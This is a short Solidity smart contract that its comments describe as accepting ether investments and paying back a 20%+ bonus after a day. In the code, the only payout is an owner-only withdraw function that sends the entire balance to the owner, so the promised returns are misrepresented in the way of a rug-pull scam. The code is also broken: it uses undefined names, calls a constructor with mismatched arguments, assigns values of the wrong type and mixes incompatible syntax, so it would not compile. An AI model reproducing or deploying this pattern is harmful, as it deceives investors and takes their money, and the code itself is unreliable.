pragma solidity ^0.4.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

// Simple contract that accepts ether investments and returns a 20%+ initial investment bonus after a day

contract AcceptAndReturn {
    
    // Accepting Ether Investment Function
    
    struct User {
        address personAddress;
        uint amount;
        string time;
    }
    
    mapping(address => User) UserList;
    
    uint acceptMoney = 0.001 ether;

    function accept() external payable {
        require(msg.value >= acceptMoney);
        User[msg.sender] = User(msg.value, block.timestamp);
        
    }
    
    // Return a 20% initial investment bonus after a day
    
    function withdraw() external onlyOwner {
        address payable _owner = address(uint160(owner()));
        _owner.transfer(address(this).balance);
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
     }
}